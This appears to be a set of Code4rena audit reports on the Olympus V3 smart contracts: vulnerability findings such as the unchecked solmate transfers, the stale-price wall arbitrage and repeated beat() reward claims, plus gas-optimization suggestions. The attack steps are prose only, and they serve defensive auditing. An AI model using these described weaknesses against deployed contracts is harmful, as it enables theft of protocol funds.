# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99   # Vulnerability details  ## Impact In `getloan()` and `replayloan()`, the `safetransfer` and `safetransferfrom` doesn't check the existence of code at the token address. This is a known issue while using solmate's libraries.  Hence this may lead to miscalculation of funds and may lead to loss of funds , because if `safetransfer()` and `safetransferfrom()` are called on a token address that doesn't have contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.  So this will lead to miscalculation and possibly loss of funds  ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99  ## Tools Used Manual code review  ## Recommended Mitigation Steps Use openzeppelin's safeERC20 or implement a code existence check  
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52   # Vulnerability details  ## Impact After contracts are deployed and initialized, the admin address in `Kernel` contract can only be set to a contract. Granting and revoking roles will be possible to do only via a contract, which looks like an unintended behavior since these operations cannot be performed via governance (the governance contract is designed to be the only executor).   ## Proof of Concept Admin address can be changed to any address (EOA or contract) in the `executeAction` function in `Kernel`: https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253  This piece explicitly allows EOA addresses since the other actions in the function (besides `ChangeExecutor`) are checked to have only a contract as the target (see `ensureContract` function calls in the other actions). This, and the fact that roles cannot be managed via governance, leads to the conclusion that an admin is designed to be an EOA.  However, in the `store` function in `INSTR`, action target can only be a contract: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52  After the contracts are deployed, `INSTR` will be the only contract that's allowed to call `Kernel.executeAction`: https://github.com/code-423n4/2022-08-olympus/blob/main/src/scripts/Deploy.sol#L220  Thus, there will be no way to change admin to an EOA. If admin needs to be an EOA, the `INSTR` contract needs to be patched and re-deployed to allow non-contract targets.  ## Tools Used  ## Recommended Mitigation Steps Allow EOA addresses as instruction targets or disallow non-contract admin addresses.
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L272 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346   # Vulnerability details  ## Description The Walls of the RBS mechanism offer zero slippage swaps at the high and low of the moving average spread. The capacity to be swapped at these prices is usually very large, so it must make sure to only be enabled when the prices are guaranteed to be synced. However, there is no such check. If beat() is not called for some time, meaning we cannot determine if the current spread is legit, swap() still operates as usual.   ## Impact The worst case scenario is that the wall is swapping at a losing price, meaning they can be immediately drained via arbitrage bot.   ## Proof of concept  1. Price is X at the start  2. Oracle stops updating for some reason / no one calls beat()  3. Price drops to Y , where Y < low wall centered around X  4. Attacker can perform arbitrage by buying Ohm at external markets at Y and selling Ohm at low wall price, netting the difference.  ## Recommended mitigation steps: Change modifier onlyWhileActive to add a check for beat out of sync: ``` if (block.timestamp > lastBeat + SYNC_THRESHOLD * frequency()) ```  
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103   # Vulnerability details  ## Impact `beat()` function is allowed to be called by anyone once in `frequency()` period. The purpose of it is to update the prices and do another operations related to bond market. User who ran it are rewarded. There is no need to run this function more then 1 time in `frequency()` period. However if `beat()` was last time called more then `frequency()` time ago then user can execute `beat()` function `(block.timestamp - lastBeat)/frequency()` times in a row in same block and get rewards.  ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103   ## Recommended Mitigation Steps https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103 Change this line to `lastBeat = block.timestamp - (block.timestamp - lastBeat) % frequency();` So no matter how much time the `beat()` was no called, it is possible to call it only once per `frequency()`. 
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L64-L102   # Vulnerability details  ## Impact Treasury allocates approvals in the withdrawApproval mapping which is set via setApprovalFor(). In both withdrawReserves() and in getLoan(), _checkApproval() is used to verify user has enough approval and subtracts the withdraw / loan amount. Therefore, there is no differentiation in validation between loan approval and withdraw approval. Policies which will use getLoan() (currently none) can simply withdraw the tokens without bookkeeping it as a loan.  ## Proof of Concept 1. Policy P has getLoan permission 2. setApprovalFor(policy, token, amount) was called to grant P permission to loan amount 3. P calls withdrawReserves(address, token, amount) and directly withdraws the funds without registering as loan  ## Recommended Mitigation Steps A separate mapping called loanApproval should be implemented, and setLoanApprovalFor() will set it, getLoan() will reduce loanApproval balance.  
 # Olympus V3 Findings  ### **Repo that implements suggested changes:** [0xClandestine/2022-08-olympus](https://github.com/0xClandestine/2022-08-olympus)  **Severity:** *Gas Optimization*  **Context:** [INSTR.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L44), [PRICE.sol#144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144), [PRICE.sol#135](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#135), [Governance.sol#L251](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L251), [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)   **Description:** Arithmetic checks aren't necessary when logic cannot realistically underflow/overflow.  **Recommendation:**  [INSTR.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L44) ```solidity -    uint256 instructionsId = ++totalInstructions; +    uint256 instructionsId; + +    unchecked { +        instructionsId = ++totalInstructions; +    } ```  **Recommendation:**  [PRICE.sol#144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144) ```solidity +    uint256 nextObs = nextObsIndex; // should cache this value  ...  -    nextObsIndex = (nextObsIndex + 1) % numObs; + +    unchecked { +        ++nextObs; +    } + +    nextObsIndex = nextObs % numObs; ```  **Recommendation:**  [PRICE.sol#135](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L135) ```solidity      // overflow/underflow is impossible here because the conditional explicitly checks the arithmetic.     if (currentPrice > earliestPrice) { -        _movingAverage += (currentPrice - earliestPrice) / numObs; + +        unchecked { +            priceDelta = currentPrice - earliestPrice; +        } + +        _movingAverage += priceDelta / numObs;     } else { -        _movingAverage -= (earliestPrice - currentPrice) / numObs; + +        unchecked { +            priceDelta = earliestPrice - currentPrice; +        } + +        _movingAverage -= priceDelta / numObs; +    } ```  **Recommendation:** [Governance.sol#L251](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L251)  ```solidity -    if (for_) { -        yesVotesForProposal[activeProposal.proposalId] += userVotes; -    } else { -        noVotesForProposal[activeProposal.proposalId] += userVotes; -    }      +    // total votes cannot exceed totalSupply +    unchecked { +        if (for_) { +            yesVotesForProposal[activeProposal.proposalId] += userVotes; +        } else { +            noVotesForProposal[activeProposal.proposalId] += userVotes; +        } +    } ```  **Recommendation:** [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)  **Note:** Consider setting lastBeat + frequency as an unchecked variable to avoid calculating it 3 times.  ```solidity function beat() external nonReentrant {     if (!active) revert Heart_BeatStopped();  -    if (block.timestamp < lastBeat + frequency())  -        revert Heart_OutOfCycle();  +   unchecked { +       if (block.timestamp < lastBeat + frequency())  +            revert Heart_OutOfCycle(); +   }      // Update the moving average on the Price module     PRICE.updateMovingAverage();      // Trigger price range update and market operations     _operator.operate();      // Update the last beat timestamp -    lastBeat += frequency();  +    unchecked { +        lastBeat += frequency(); +    }      // Issue reward to sender     _issueReward(msg.sender);      emit Beat(block.timestamp); } ``` ___  **Severity:** *Gas Optimization*  **Context:** [PRICE.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L252), [PRICE.sol#L284](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L284)  **Description:** Use [delete](https://docs.soliditylang.org/en/v0.8.0/types.html#delete) keyword when mutating state variables back to null/zero value to receive a gas refund.  **Recommendation:**  [PRICE.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L252) ```solidity -    initialized = false; -    lastObservationTime = 0; -    _movingAverage = 0; -    nextObsIndex = 0;  +    delete initialized; +    delete lastObservationTime; +    delete _movingAverage; +    delete nextObsIndex; ```  **Recommendation:**  [PRICE.sol#L284](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L284) ```solidity -    initialized = false; -    lastObservationTime = 0; -    _movingAverage = 0; -    nextObsIndex = 0;  +    delete initialized; +    delete lastObservationTime; +    delete _movingAverage; +    delete nextObsIndex; ```  ___  **Severity:** *Gas Optimization*  **Context:** [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278), [PRICE.sol#L122](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L122), [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)  **Description:** Cache state variables and array lengths before readings them multiple times (like in a loop).  **Recommendation:** [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278) ```solidity -    for (uint256 step; step < instructions.length; ) {      +    uint256 instructionsLength = instructions.length; + +    for (uint256 step; step < instructionsLength;) { ```  **Recommendation:** [PRICE.sol#L122](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L122) ```solidity  // 2 SLOADs saved  function updateMovingAverage() external permissioned {     // Revert if not initialized     if (!initialized) revert Price_NotInitialized();      // Cache number of observations to save gas.     uint32 numObs = numObservations;  +    // Cache next observation index to save gas. +    uint256 nextObs = nextObsIndex; // avoid SLOADs      // Get earliest observation in window -   uint256 earliestPrice = observations[nextObsIndex]; +   uint256 earliestPrice = observations[nextObs]; // avoid SLOAD      uint256 currentPrice = getCurrentPrice();      // Calculate new moving average     if (currentPrice > earliestPrice) {         _movingAverage += (currentPrice - earliestPrice) / numObs;     } else {         _movingAverage -= (earliestPrice - currentPrice) / numObs;     }      // Push new observation into storage and store timestamp taken at -    observations[nextObsIndex] = currentPrice; +    observations[nextObs] = currentPrice; // avoid SLOAD     lastObservationTime = uint48(block.timestamp); -    nextObsIndex = (nextObsIndex + 1) % numObs; +    nextObsIndex = (nextObs + 1) % numObs; // avoid SLOAD      emit NewObservation(block.timestamp, currentPrice, _movingAverage); } ```   **Recommendation:** [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)  ```solidity  // 2 SLOADs saved  function beat() external nonReentrant {     if (!active) revert Heart_BeatStopped();  +    uint256 _lastBeat = lastBeat;  -    if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle(); +    if (block.timestamp < _lastBeat + frequency()) revert Heart_OutOfCycle();      // Update the moving average on the Price module     PRICE.updateMovingAverage();      // Trigger price range update and market operations     _operator.operate();      // Update the last beat timestamp -    lastBeat += frequency(); +    lastBeat = _lastBeat + frequency(); // += causes another SLOAD      // Issue reward to sender     _issueReward(msg.sender);      emit Beat(block.timestamp); }  ``` ___  **Severity:** *Gas Optimization*  **Context:** [Governance.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L194)  **Description:** Mutating a single slot multiple times in a function should be avoided when possible.  **Recommendation:** [Governance.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L194)  **Note:** a = a + b or a = a - b is slightly cheaper than a += b or a -= b when mutating mappings. This can be applied other places in the codebase as well.  ```solidity  // 1 SSTORE saved  function endorseProposal(uint256 proposalId_) external {     uint256 userVotes = VOTES.balanceOf(msg.sender);      if (proposalId_ == 0) {         revert CannotEndorseNullProposal();     }      Instruction[] memory instructions = INSTR.getInstructions(proposalId_);     if (instructions.length == 0) {         revert CannotEndorseInvalidProposal();     }      // undo any previous endorsement the user made on these instructions     uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender]; -    totalEndorsementsForProposal[proposalId_] -= previousEndorsement;      // reapply user endorsements with most up-to-date votes     userEndorsementsForProposal[proposalId_][msg.sender] = userVotes; -    totalEndorsementsForProposal[proposalId_] += userVotes; +    totalEndorsementsForProposal[proposalId_] = totalEndorsementsForProposal[proposalId_] - previousEndorsement + userVotes; // this can potentially be unchecked      emit ProposalEndorsed(proposalId_, msg.sender, userVotes); } ```
 ## 1. ++i costs less gas compared to i++ or i += 1, same for --i/i--. Especially in for loops  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments i and returns the initial value of `i`.  ``` uint i = 1;   i++; // == 1 but i == 2 ``` But ++i returns the actual incremented value: ``` uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ``` In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  I suggest using ++i instead of i++ to increment the value of an uint variable.  If done inside for loop, saves 6 gas per loop.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol ``` 49:         i++; 64:         i++; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol ``` 488:        decimals++; 670:        _status.low.count++; 675:        _status.low.count--; 686:        _status.high.count++; 691:        _status.high.count--; ```  ## 2. Use a more recent version of solidity  - Use a solidity version of at least 0.8.0 to get overflow protection without SafeMath   - Use a solidity version of at least 0.8.2 to get compiler automatic inlining   - Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads   - Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings   - Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value   https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondCallback.sol  ``` 2:   pragma solidity >=0.8.0; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IHeart.sol ``` 2:   pragma solidity >=0.8.0; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol ``` 2:   pragma solidity >=0.8.0;  ```  ## 3. No need to explicitly initialize variables with default values  If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: `for (uint256 i = 0; i < reqLength;) {` should be replaced with for `(uint256 i; i < reqLength;) {`  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol ```  397:       for (uint256 i = 0; i < reqLength; ) { ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol ``` 43:       for (uint256 i = 0; i < 5; ) { 58:      for (uint256 i = 0; i < 32; ) { ```  ## 4. \<x\> += \<y\> costs more gas than \<x\> = \<x\> + \<y\> for state variables  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol ``` 96:         reserveDebt[token_][msg.sender] += amount_; 97:         totalDebt[token_] += amount_; 131:        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol ``` 136:        _movingAverage += (currentPrice - earliestPrice) / numObs; 222:        total += startObservations_[i]; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol ``` 58:          balanceOf[to_] += amount_; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol ``` 143:        _amountsPerMarket[id_][0] += inputAmount_; 144:        _amountsPerMarket[id_][1] += outputAmount_; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol ``` 103:        lastBeat += frequency(); ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol ``` 198:        totalEndorsementsForProposal[proposalId_] += userVotes; 252:        yesVotesForProposal[activeProposal.proposalId] += userVotes; 254:        noVotesForProposal[activeProposal.proposalId] += userVotes; ```  ## 5. \<array>.length should not be looked up in every loop of a for-loop  The overheads outlined below are PER LOOP, excluding the first loop  - storage arrays incur a Gwarmaccess (100 gas) - memory arrays use MLOAD (3 gas) - calldata arrays use CALLDATALOAD (3 gas)  Caching the length changes each of these to a DUP\<N> (3 gas), and gets rid of the extra DUP\<N> needed to store the stack offset  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol ``` 279:        for (uint256 step; step < instructions.length; ) { ```  ## 6. Boolean comparisons  Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value. I suggest using if(directValue) instead of if(directValue == true)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol ``` 223:        if (proposalHasBeenActivated[proposalId_] == true) { 306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ## 7 . Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead  When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  There are uint8, uint32, uint48 in almost all contracts in scope, they should all be checked and if possible use uint/int. Example: https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol - 31, 32, 33 ```         31:   uint32 count; // current number of price points that count towards regeneration 32:         uint48 lastRegen; // timestamp of the last regeneration 33:         uint32 nextObservation; // index of the next observation in the observations array ```  ## 8. Using bools for storage incurs overhead  // Booleans are more expensive than uint256 or any type that takes up a full // word because each write operation emits an extra SLOAD to first read the // slot's contents, replace the bits taken up by the boolean, and then write // back. This is the compiler's defense against contract upgrades and  // pointer aliasing, and it cannot be disabled.  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27  Use uint256(1) and uint256(2) for true/false  All contracts should be checked and if possible avoid using uint instead of bools Example: https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol - 113, 181, 197 ``` 113:    bool public isActive; 181:    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; 197:    mapping(Role => bool) public isRole; ```  ## 9. Not using the named return variables when a function returns, wastes deployment gas  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol ``` 493:        return decimals - int8(PRICE.decimals()); ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol ``` 122:        return uint256(PRICE.observationFrequency()); ```  ## 10. Multiplication/division by two should use bit shifting   \<x> * 2 is equivalent to \<x> << 1 and \<x> / 2 is the same as \<x> >> 1. The MUL and DIV opcodes cost 5 gas, whereas SHL and SHR only cost 3 gas  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol - 372, 419, 420, 427, 786 ``` 372:            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 419:            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 420:            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 427:            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); 786:            ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ```  
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L61   # Vulnerability details  ## Impact & Proof Of Concept In `INSTR.sol`, it is correctly checked that a `ChangeExecutor` instruction only occurs at the last position to avoid situations where the other instructions are deemed as invalid. However, the same problem can occur for `MigrateKernel`. For instance, let's say we have a `MigrateKernel` followed by a `DeactivatePolicy` action. The `MigrateKernel` action will change the value of `kernel` within the policy. The `DeactivatePolicy` action tries to call `setActiveStatus` on the policy. However, this has a `onlyKernel` modifier and the call will therefore fail when it is done after the value of `kernel` was changed.  ## Recommended Mitigation Steps Perform the same check for `MigrateKernel`.
# Low effect on readability  ## [G-01] Use `!= 0` instead of `> 0` for unsigned integers. A `uint` can't be below zero, so `!= 0` is sufficient and is gas more efficient.  1 instance: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247  Consider replacing `>` by `!=`.  *save 3 gas*  ## [G-02] Unnecessary initialization of variable  Some data type have a default value which is already the desired one. The default value of `uint` is `0`, it is so unnecessary to initialize these again.  3 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L397 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L43 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L58  Consider removing `= 0`  *save 3 gas each*  ## [G-03] Transformation of post-increment to pre-increment A pre-increment is cheaper than a post one. When it is possible, it is a good practice to apply pre-increment.  5 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686  Consider transforming those.  With those changes, these evolutions in gas average report can be observe:      Operator: operate: 122263 -> 122255 (-8)  ## [G-04] Expression like `x = x + y` are cheaper than `x += y` for states variables.  4 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L135-L139 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103  Consider replacing `+=` and `-=`   With those changes, these evolutions in gas average report can be observe:      OlympusPrice: Deployment: 1117743 -> 1115143 (-2600)     OlympusHeart: Deployment: 934119 -> 932719 (-1400)     OlympusHeart: beat: 29228 -> 29221 (-7)  ## [G-05] Some operations can be marked unchecked If an operation can't overflow, it is cheaper to mark it as unchecked to avoid the automatic check of overflow. In this case:      while  (price_ >=  10)  {   price_ = price_ /  10;   decimals++;  } The operation can't overflow or undeflow  1 instances  - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L486-L489   Consider marking it unchecked  With this changes, these evolutions in gas average report can be observe:      Operator: Deployment: 4679925 -> 4670317 (-9608)     Operator: operate: 122263 -> 121936 (-327)  This part can already be subjected to two improvements, however this one is still largely ineffective, especially for large numbers up to 2^256. It would be very useful to import a log10 function from an external mathematical library. The gain can be very important.  ## [G-06] Unnecessary public constant Declaring a private constant is cheaper than a public one. In some case, a constant can be declared as private to save gas. It is the case if the constant don't need to be called outside the contract. A user could still read the value directly in the code instead of calling it, if needed.  8 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121-L137 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89  Consider changing those constants to private. (The code still pass all the test with these changes.)  With those changes, these evolutions in gas average report can be observe:      OlympusRange: Deployment: 1125279 -> 1121272 (-4007)     OlympusRange: spread: 655 -> 545 (-110)     OlympusGovernance: Deployment: 1638243 -> 1604601 (-33642)     OlympusGovernance: activateProposal: 52753 -> 52730 (-23)     OlympusGovernance: configureDependencies: 48513 -> 48490 (-23)     OlympusGovernance: endorseProposal: 39015 -> 39037 (+22)     OlympusGovernance: executeProposal: 171376 -> 171467 (+91)     OlympusGovernance: getMetadata: 2195 -> 2172 (-23)     OlympusGovernance: isActive: 696 -> 740 (+44)     OlympusGovernance: noVotesForProposal: 549 -> 571 (+22)     OlympusGovernance: proposalHasBeenActivated:486 -> 463 (-23)     OlympusGovernance: reclaimVotes: 10009 -> 9927 (82)     OlympusGovernance: requestPermissions: 2953 -> 2997 (+44)     OlympusGovernance: tokenClaimsForProposal: 684 -> 728 (+44)     OlympusGovernance: totalEndorsementsForProposal: 529 -> 506 (-23)     OlympusGovernance: userEndorsementsForProposal: 727 ->  639 (-88)     OlympusGovernance: userVotesForProposal: 662 -> 706 (-23)     OlympusGovernance: vote: 61568 -> 61612 (+44)     OlympusGovernance: yesVotesForProposal: 506 -> 483 (-23)     Operator: Deployment: 4679925 -> 4671717 (-8208)     Operator: auctioneer: 437 -> 372 (-65)     Operator: callback: 439 -> 372 (-67)     Operator: config: 1224 -> 1246 (+19)     Operator: configureDependencies: 121016 -> 121038 (+22)     Operator: fullCapacity: 5237 -> 5204 (-33)     Operator: initialize: 316017 -> 315844 (-173)     Operator: initialized: 1356 -> 1379 (+23)     Operator: isActive: 439 -> 373 (-66)     Operator: operate: 122263 -> 122281 (+18)     Operator: regenerate: 17622 -> 17612 (-10)     Operator: requestPermissions: 6634 -> 6656 (+22)     Operator: setBondContracts: 5267 -> 5289 (+22)     Operator: setRegenParams: 11480 -> 11413 (-67)     Operator: setSpreads: 9650 -> 9672 (+22)     Operator: setThresholdFactor: 12113 -> 12135 (+22)     Operator: status: 8988 -> 9010 (+22)     Operator: swap: 54322 -> 54342 (+20)     Operator: toggleActive: 7460 -> 7482 (+22)  ## [G-07] Using `storage` instead of `memory`  can be cheaper.  A `storage` structure is pre allocated by the contract, by contrast, a `memory` one is newly created. Depending on the case both can be used to optimize the gas cost because simply, a `storage` is cheaper to create but more expensive to read from and to return and a `memory` on the other hand is more expensive to create but cheaper to read from and to return. We can optimize with trials and errors instead of complex calculations (which will probably work a bit better, but it's not done here).  Following this, we can deduce 7 cases that can be swapped to optimize runtime cost and deployment cost: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L379 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L179 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L206 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L206 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L385 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L440 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L666  Consider changing `memory` to `storage` in these lines  With these changes, these evolutions in gas average report can be observed:      Kernel: Deployment:  1473364->1456343 (-17021)     OlympusRange: Deployment:   1125279 -> 1121272 (-4007)     OlympusRange: spread: 655 -> 545 (-110)     BondCallback: Deployment: 1408325 ->  1391912  (-16413)     BondCallback: amountsForMarket: 1921 -> 1669 (-252)     OlympusGovernance: Deployment: 1638243 -> 1596194 (-42049)     OlympusGovernance: activateProposal: 52753 -> 51723 (-1030)     Operator: Deployment: 4679925 -> 4566769 (-113156)     Operator: fullCapacity: 5237 -> 5182 (-55)     Operator: initialize: 316017 -> 315911 (-106)     Operator: operate: 122263 -> 118511 (-3752)     Operator: regenerate: 17622 -> 17593 (-29)     ModuleTestFixture :Deployment: 422065 -> 399069 (-22996)    ## [G-08] Using `calldata` instead of `memory` for read only argument in external function If a function parameter is read only, it is cheaper in gas to use `calldata` instead of `memory`.  4 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L152 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53  Consider changing `memory` to `calldata` in these lines/  With these changes, these evolutions in gas average report can be observed:      OlympusPrice: Deployment: 1117743 -> 1101930 (-15813)     OlympusPrice: initialize: 432495 -> 430562 (-1933)     BondCallback: Deployment: 1408325 -> 1386305 (-22020)     BondCallback: batchToTreasury: 12729 -> 12543 (-186)     OlympusPriceConfig: initialize: 491657 -> 486274 (-5383)     TreasuryCustodian: Deployment: 739696 -> 719277 (-20419)     TreasuryCustodian: revokePolicyApprovals: 6956 -> 6842 (-114)  # Medium effect in use ## [G-09] `external` function for the admin can be marked as `payable`  If a function is guaranteed to revert when called by a normal user, this function can be marked as `payable` to avoid the check to know if a payment is provided.  2 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439 - 